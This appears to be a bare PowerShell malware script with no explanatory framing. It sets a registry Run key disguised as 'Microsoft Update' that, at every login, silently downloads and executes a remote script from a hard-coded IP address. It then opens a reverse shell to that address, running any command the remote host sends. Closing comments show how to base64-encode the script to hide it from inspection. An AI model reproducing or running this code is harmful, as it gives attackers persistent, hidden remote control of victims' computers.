Set-ItemProperty -Path "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Microsoft Update" -Value "powershell -w Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://163.172.144.82/scrip/ch.ps1')" -Force
$client = New-Object System.Net.Sockets.TCPClient("163.172.144.82",4544);
$stream = $client.GetStream();

$greeting = "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();
[byte[]]$bytes = 0..255|%{0};


while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush() };
$client.Close();
//cat reverse.ps1 |  iconv -f UTF8 -t UTF16LE | base64 -w0
//powershell -Enc payload
